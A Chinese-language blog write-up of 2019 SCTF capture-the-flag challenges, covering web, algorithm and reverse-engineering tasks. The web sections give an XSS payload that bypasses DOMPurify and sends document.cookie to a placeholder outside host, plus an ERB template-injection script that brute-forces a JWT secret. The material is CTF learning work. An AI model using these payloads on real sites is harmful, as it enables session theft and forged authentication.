---
title: 2019 SCTF 部分 WriteUp
tags:
  - CTF
  - WriteUp
date: 2019-06-24 14:42:59
toc: true
---

刚刚毕业，正好周末遇上SCTF，打了两天，这里记录一下做的几道题
<!-- more -->

## math-is-fun1
题目给了个在线编辑器
http://47.110.128.101/challenge?name=Challenger
可以提交一个url到服务器，结合hint确定是要xss了
http://47.110.128.101/send_message.html

启用了Dompurify，且配置文件http://47.110.128.101/config 如下
```json
({"SAFE_FOR_JQUERY":true,"ALLOWED_TAGS":["style","img","video"],"ALLOWE
D_ATTR":["style","src","href"],"FORBID_TAGS":["base","svg","link","iframe","frame","embed"]})
```
分析了页面里的js代码
渲染流程如下：
- 服务器将name参数拼接到一个config类型的script标签中
- 读取上面那个标签的内容并解析然后给window[]赋值 （这里可以变量覆盖）
- 将config[name]拼接到textarea中
- 读取location.search中的text，URLdecode后覆盖textarea
- 监听textarea变化后会执行如下事件
  - 读取textarea的内容
  - Dompurify过滤 （上面发的先知链接已经被修复）
  - markdown渲染 （不知道用的啥库）
  - latex渲染 （用的mathjax2.7.5不存在已知xss）
  - 插入页面

猜测是要覆盖DOMPurify的某些变量，能够使其失效，翻看Dompurify的源码
```
https://github.com/cure53/DOMPurify/blob/c57dd450d8613fddfda67ad182526f371b4638fd/src/purify.js :966
```

![](/img/2019-sctf-1.png)
当`DOMPurify.isSupported`为`false`，则能够绕过过滤
于是构造
```javascript
name=a;alert(1);%0aDOMPurify[%27isSupported%27]%3dfalse&text=<script>alert(1)
```

把`DOMPurify.isSupported`设置为false，text参数的值就能直接插入页面中，造成xss
（这里不知道为啥`text=<script>alert(1)`直接就绕过csp弹窗了，可能是非预期
![](/img/2019-sctf-2.png)

最后payload：
```javascript
name=a;alert(1);%0aDOMPurify[%27isSupported%27]%3dfalse&text=<script>window.location.href%3d"http://xxxx.xxxx/?a%3d"%2bescape(document.cookie)
```

两题都可以用这个paylaod打
![](/img/2019-sctf-3.png)

## math-is-fun2
题解同上，
payload：
```javascript
name=a;alert(1);%0aDOMPurify[%27isSupported%27]%3dfalse&text=<script>window.location.href%3d"http://xxxx.xxxx/?a%3d"%2bescape(document.cookie)
```
## flag shop
robots.txt提示/filebak，访问后拿到源码：
```ruby
require 'sinatra'
require 'sinatra/cookies'
require 'sinatra/json'
require 'jwt'
require 'securerandom'
require 'erb'

set :public_folder, File.dirname(__FILE__) + '/static'

FLAGPRICE = 1000000000000000000000000000
#ENV["SECRET"] = SecureRandom.hex(xx)

configure do
 enable :logging
 file = File.new(File.dirname(__FILE__) + '/../log/http.log',"a+")
 file.sync = true
 use Rack::CommonLogger, file
end

get "/" do
 redirect '/shop', 302
end

get "/filebak" do
 content_type :text
 erb IO.binread __FILE__
end

get "/api/auth" do
 payload = { uid: SecureRandom.uuid , jkl: 20}
 auth = JWT.encode payload,ENV["SECRET"] , 'HS256'
 cookies[:auth] = auth
end

get "/api/info" do
 islogin
 auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
 json({uid: auth[0]["uid"],jkl: auth[0]["jkl"]})
end

get "/shop" do
 erb :shop
end

get "/work" do
 islogin
 auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }
 auth = auth[0]
 unless params[:SECRET].nil?
   if ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")
     puts ENV["FLAG"]
   end
 end

 if params[:do] == "#{params[:name][0,7]} is working" then

   auth["jkl"] = auth["jkl"].to_i + SecureRandom.random_number(10)
   auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
   cookies[:auth] = auth
   ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result

 end
end

post "/shop" do
 islogin
 auth = JWT.decode cookies[:auth],ENV["SECRET"] , true, { algorithm: 'HS256' }

 if auth[0]["jkl"] < FLAGPRICE then

   json({title: "error",message: "no enough jkl"})
 else

   auth << {flag: ENV["FLAG"]}
   auth = JWT.encode auth,ENV["SECRET"] , 'HS256'
   cookies[:auth] = auth
   json({title: "success",message: "jkl is good thing"})
 end
end


def islogin
 if cookies[:auth].nil? then
   redirect to('/shop')
 end
end
```

发现
```ruby
ERB::new("<script>alert('#{params[:name][0,7]} working successfully!')</script>").result
```

存在erb模版注入，构造name为 `<%=$~%>`，do为`<%=$~%> is working`，结合
```ruby
ENV["SECRET"].match("#{params[:SECRET].match(/[0-9a-z]+/)}")，
```

其中的`SECRET`参数可控，如果匹配到SECRET，则`$~`(ruby特性，表示最近一次正则匹配结果) 会在页面中返回，于是可以爆破secret，然后伪造JWT去买flag。
爆破脚本如下：
```python
import requests
import base64

url = "http://47.110.15.101"
re = requests.session()
re.get(url + "/api/auth")

flag = "09810e652ce9fa4882fe4875c"
while True:
   i = ""
   for i in "0123456789abcdef":
       #now = flag + i
       now = i + flag
       res = re.get(url + "/work?name=%3c%25%3d%24%7e%25%3e&do=%3c%25%3d%24%7e%25%3e%20is%20working&SECRET="+now)
       if len(res.text) > 48:
           print res.text
           print flag
           flag = now
           break
print flag
```
![](/img/2019-sctf-4.png)
拿到SECRET后就是伪造cookie去买flag了
![](/img/2019-sctf-5.png)
![](/img/2019-sctf-6.png)


## Maaaaaaze
题目意思是找100*100的迷宫中任意两点最大路径
于是把html处理一下，然后任意取一个点作为起点，扔到dfs里跑最长路径，等跑不动的时候拿当前最长路径的重点作为起点再扔进dfs去跑，最后就得到答案`4056`了
脚本如下（好久没写算法了还真有点手生）：
```python
import sys
sys.setrecursionlimit(100000)

file = open("sctfmaze.txt")
maze = [[0 for j in range(0, 100)] for i in range(0, 100)]
vis = [[0 for j in range(0, 100)] for i in range(0, 100)]
class Node:
   t = 0
   r = 0
   b = 0
   l = 0
#print maze
for line in file:
   a = line[:-1].split(" ")
   #print a
   n = Node()
   for i in range(2,len(a)):
       #print a[i],
       if a[i] == '0' :
           n.t = 1
       if a[i] == '1' :
           n.r = 1
       if a[i] == '2' :
           n.b = 1
       if a[i] == '3' :
           n.l = 1
       #print a[i],
   #print
   maze[int(a[0])][int(a[1])] = n
   #print a[0],a[1],maze[int(a[0])][int(a[1])].b
#exit()
def check(i,j):
   if i>=100 or i<0 or j>=100 or j<0:
       return False
   if vis[i][j] == 1:
       return False
   return True

def printmap():
   global vis
   for i in range(0,100):
       for j in range(0,100):
           if vis[i][j] == 1:
               print "%2d%2d" % (i,j)
           print "    "

maxx = 0
print maxx,i,j

def dfs(i,j,n):
   global maxx
   global vis
   global maze
   n += 1
  
   #print maxx,i,j,n,maze[i][j].t,maze[i][j].r,maze[i][j].b,maze[i][j].l
   if n>maxx:
       print n,i,j
       #print n,i,j,maze[i][j].t,maze[i][j].r,maze[i][j].b,maze[i][j].l
  
       maxx = n
   if check(i-1,j) and maze[i][j].t == 0:
       vis[i-1][j] = 1
       dfs(i-1,j,n)
       vis[i-1][j] = 0
   if check(i,j+1) and maze[i][j].r == 0:
       vis[i][j+1] = 1
       dfs(i,j+1,n)
       vis[i][j+1] = 0
   if check(i+1,j) and maze[i][j].b == 0:
       vis[i+1][j] = 1
       dfs(i+1,j,n)
       vis[i+1][j] = 0
   if check(i,j-1) and maze[i][j].l == 0:
       vis[i][j-1] = 1
       dfs(i,j-1,n)
       vis[i][j-1] = 0

vis[70][22] = 1
dfs(70,22,0)
exit()

for i in range(0,100):
   for j in range(0,100):
       #print i,j
       vis[i][j] = 1
       dfs(i,j,0)
       vis[i][j] = 0
```


## music
这是道逆向题，前面是队友做的，到我这给了我一个java的加密类和密文与密钥，要求解出明文
```java
public class c
{
  private static int m = 256;
  
  public String a(String paramString1, String paramString2)
  {
    int i = m;
    int[] arrayOfInt = new int[i];
    byte[] arrayOfByte = new byte[i];
    for (i = 0; i < m; i++)
    {
      arrayOfInt[i] = i;
      arrayOfByte[i] = ((byte)(byte)paramString2.charAt(i % paramString2.length()));
    }
    i = 0;
    int j = 0;
    for (;;)
    {
      k = m;
      if (i >= k - 1) {
        break;
      }
      j = (arrayOfInt[i] + j + arrayOfByte[i]) % k;
      k = arrayOfInt[i];
      arrayOfInt[i] = arrayOfInt[j];
      arrayOfInt[j] = k;
      i++;
    }
    paramString2 = paramString1.toCharArray();
    paramString1 = new char[paramString1.length()];
    int k = 0;
    j = 0;
    for (i = 0; i < paramString2.length; i++)
    {
      int n = m;
      k = (k + 1) % n;
      j = (arrayOfInt[k] + j) % n;
      int i1 = arrayOfInt[k];
      arrayOfInt[k] = arrayOfInt[j];
      arrayOfInt[j] = i1;
      int i2 = arrayOfInt[k];
      i1 = arrayOfInt[k];
      paramString1[i] = ((char)(char)(paramString2[i] - k ^ (char)arrayOfInt[((i2 + i1 % n) % n)]));
    }
    new p();
    return p.a(new String(paramString1).getBytes());
  }
}
```

分析加密类之后可以知道每个字符进去后输出的密文都是一个固定的字符串
于是直接爆破每一位
```java
import java.lang.String;

public class Main {
   public static void main(String[] args) {
       c a = new c();
       String flag = "sctf{";
       String printable = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-.:;<=>?@[]^_{|}~";
       String ss = "C28BC39DC3A6C283C2B3C39DC293C289C2B8C3BAC29EC3A0C3A7C29A1654C3AF28C3A1C2B1215B53";
       for(int j=0;j<100;j++)
       {
           for(int i=0;i<printable.length();i++)
           {
               String now=  flag + printable.charAt(i);
               //System.out.println(now);
               String d = a.a(now,"E7E64BF658BAB14A25C9D67A054CEBE5");
               if(ss.indexOf(d) == 0)
               {
                   System.out.println("flag: " + now);
                   flag = now;
               }
           }
           //break;
       }
   }
}
```
![](/img/2019-sctf-7.png)

## 后记
好久没有这么肝一场比赛了，最后我们队因为123血太少只拿了第三，稍微有些遗憾，但还是感谢队友，感谢出题和运维师傅们递茶，给师傅们递茶！
